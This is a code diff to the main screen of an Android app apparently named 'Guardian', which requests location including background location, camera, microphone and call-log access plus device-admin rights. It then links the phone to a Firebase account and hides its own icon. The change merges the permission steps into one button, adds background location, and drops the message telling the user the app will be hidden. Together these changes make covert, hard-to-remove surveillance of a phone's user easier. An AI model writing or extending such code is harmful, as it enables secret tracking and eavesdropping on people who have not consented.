@@ -7,9 +7,8 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Bundle
 import android.view.View
-import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
 import androidx.lifecycle.lifecycleScope
 import com.salzkreis.guardian.admin.AdminReceiver
 import com.salzkreis.guardian.databinding.ActivityMainBinding
@@ -21,12 +20,22 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
     private lateinit var firebaseManager: FirebaseManager
-    private val dpm by lazy { getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager }
+
     private val adminComponent by lazy { ComponentName(this, AdminReceiver::class.java) }
+    private val dpm by lazy { getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager }
+
+    private val permissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { activate() }
+
+    private val adminLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { activate() }
 
     private val permissions = arrayOf(
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
         Manifest.permission.CAMERA,
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.READ_CALL_LOG,
@@ -47,45 +56,64 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        binding.btnRequestPermissions.setOnClickListener {
-            ActivityCompat.requestPermissions(this, permissions, 100)
+        binding.btnActivate.setOnClickListener {
+            val email = binding.etEmail.text.toString().trim()
+            val password = binding.etPassword.text.toString().trim()
+            val deviceId = binding.etDeviceId.text.toString().trim()
+            if (email.isEmpty() || password.isEmpty() || deviceId.isEmpty()) {
+                binding.tvStatus.visibility = View.VISIBLE
+                binding.tvStatus.text = "Bitte alle Felder ausfüllen"
+                return@setOnClickListener
+            }
+            requestMissingPermissions()
         }
 
-        binding.btnRequestAdmin.setOnClickListener {
-            startActivity(
+        // Berechtigungs-Buttons ausblenden – alles läuft über den einen Button
+        binding.btnRequestPermissions.visibility = View.GONE
+        binding.btnRequestAdmin.visibility = View.GONE
+    }
+
+    private fun requestMissingPermissions() {
+        val missing = permissions.filter {
+            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
+        }
+        if (missing.isNotEmpty()) {
+            permissionLauncher.launch(missing.toTypedArray())
+        } else {
+            activate()
+        }
+    }
+
+    private fun activate() {
+        // Geräteadmin anfordern falls noch nicht aktiv
+        if (!dpm.isAdminActive(adminComponent)) {
+            adminLauncher.launch(
                 Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                     putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                     putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.admin_description))
                 }
             )
+            return
         }
 
-        binding.btnActivate.setOnClickListener {
-            val email = binding.etEmail.text.toString().trim()
-            val password = binding.etPassword.text.toString().trim()
-            val deviceId = binding.etDeviceId.text.toString().trim()
+        // Firebase-Login & Aktivierung
+        val email = binding.etEmail.text.toString().trim()
+        val password = binding.etPassword.text.toString().trim()
+        val deviceId = binding.etDeviceId.text.toString().trim()
 
-            if (email.isEmpty() || password.isEmpty() || deviceId.isEmpty()) {
-                Toast.makeText(this, "Bitte alle Felder ausfüllen", Toast.LENGTH_SHORT).show()
-                return@setOnClickListener
-            }
+        binding.btnActivate.isEnabled = false
+        binding.tvStatus.visibility = View.VISIBLE
+        binding.tvStatus.text = "Verbinde mit Firebase…"
 
-            binding.btnActivate.isEnabled = false
-            binding.tvStatus.text = "Verbinde mit Firebase..."
-            binding.tvStatus.visibility = View.VISIBLE
-
-            lifecycleScope.launch {
-                try {
-                    firebaseManager.signInAndConfigure(email, password, deviceId)
-                    startGuardianService()
-                    hideAppIcon()
-                    binding.tvStatus.text = "✓ Guardian aktiviert"
-                    Toast.makeText(this@MainActivity, "Guardian aktiv. App wird versteckt.", Toast.LENGTH_LONG).show()
-                    finish()
-                } catch (e: Exception) {
-                    binding.tvStatus.text = "Fehler: ${e.message}"
-                    binding.btnActivate.isEnabled = true
-                }
+        lifecycleScope.launch {
+            try {
+                firebaseManager.signInAndConfigure(email, password, deviceId)
+                startGuardianService()
+                hideAppIcon()
+                finish()
+            } catch (e: Exception) {
+                binding.tvStatus.text = "Fehler: ${e.message}"
+                binding.btnActivate.isEnabled = true
             }
         }
     }
